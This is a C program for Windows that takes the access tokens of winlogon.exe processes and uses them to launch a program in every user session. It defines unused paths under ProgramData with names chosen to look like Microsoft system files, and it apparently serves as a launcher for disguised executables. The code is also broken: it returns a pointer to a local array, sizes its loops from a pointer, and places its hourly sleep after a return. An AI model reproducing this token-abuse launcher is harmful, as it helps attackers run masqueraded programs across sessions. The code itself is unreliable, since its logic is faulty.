#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <Windows.h>
#include <wtsapi32.h>
#include <tlhelp32.h>

#pragma comment(lib, "WtsApi32.lib")

#define PATH L"C:\\ProgramData\\Microsoft\\IdentityCRL\\NotificationController.exe"
#define PATH2 L"C:\\ProgramData\\Microsoft\\Vault\\DriverStore.exe"
#define PATH3 L"C:\\ProgramData\\Microsoft\\Diagnosis\\ApplyTrustOffline.exe"


int* GetPIDByName(const wchar_t* cwcProcess) {
    int pid[30] = { 0 };

    // Create toolhelp snapshot.
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry;
    ZeroMemory(&processEntry, sizeof(processEntry));
    processEntry.dwSize = sizeof(processEntry);

    // Walkthrough all processes.
    int counter = 0;
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            // Compare process.szExeFile based on format of name, i.e., trim file path
            // trim .exe if necessary, etc.

            if (wcscmp(processEntry.szExeFile, cwcProcess) == 0) {
                //printf("%d\n", process.th32ProcessID);
                pid[counter] = processEntry.th32ProcessID;
                counter++;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    return pid;
}


DWORD OpenProcessAtSession(int pid, const wchar_t* path) {

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    HANDLE hToken, hProcess;
    LPCWSTR lpcwPath = path;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&hToken, sizeof(hToken));

    si.cb = sizeof(si);
    si.wShowWindow = TRUE;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("OP Error %d\n", GetLastError());
        return GetLastError();
    }
    
    if (OpenProcessToken(hProcess, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken) == 0) {
        CloseHandle(hProcess);
        printf("OPT Error %d\n", GetLastError());
        return GetLastError();
    }

    if (CreateProcessAsUserW(hToken, lpcwPath, NULL, NULL, NULL, FALSE, CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
        printf("Created\n");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    else {
        printf("CreateProcessAsUser Error %d\n",GetLastError());
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);
    return 0;
}


int CreateProcessAtSession(int PID, const wchar_t* exeName, const wchar_t* path) {

    DWORD WinLogonSess = 0;
    ProcessIdToSessionId(PID, &WinLogonSess);
    int* piProcessExist = GetPIDByName(exeName);
    
    int exist = 0;
    for (int i = 0; i <= (sizeof(piProcessExist) / sizeof(int)); i++) {
        if (1 < piProcessExist[i]) {

            DWORD ProcessSess = 0;
            if (ProcessIdToSessionId(piProcessExist[i], &ProcessSess) == 0) {
                //printf("Error opening proccess\n");
                return GetLastError();
            }

            //printf("WinLogon %d at session %d process %d at session %d\n", PID, WinLogonSess, piProcessExist[i], ProcessSess);
            if (ProcessSess == WinLogonSess) {
                printf("Process Exists at Session %d\n", WinLogonSess);
                exist = 1;
                break;
            }

        }
    }
    if (exist == 0) {
        printf("Process Creating for session %d\n", WinLogonSess);
        OpenProcessAtSession(PID, path);
        //printf("Process Created\n");
    }
}


int main() {

    while (TRUE) {
        int* piProcessPid = GetPIDByName(L"winlogon.exe");
        int processPids[sizeof(piProcessPid) / sizeof(int)];

        for (int i = 0; i <= (sizeof(piProcessPid) / sizeof(int) - 1); i++) {
            processPids[i] = piProcessPid[i];
        }


        for (int i = 0; i <= (sizeof(processPids) / sizeof(int) - 1); i++) {
            if (1 < processPids[i]) {
                CreateProcessAtSession(processPids[i], L"notepad.exe", L"C:\\Windows\\System32\\notepad.exe");
            }
        }
        return 0;
        Sleep(3600000);
    }
    return 0;
}
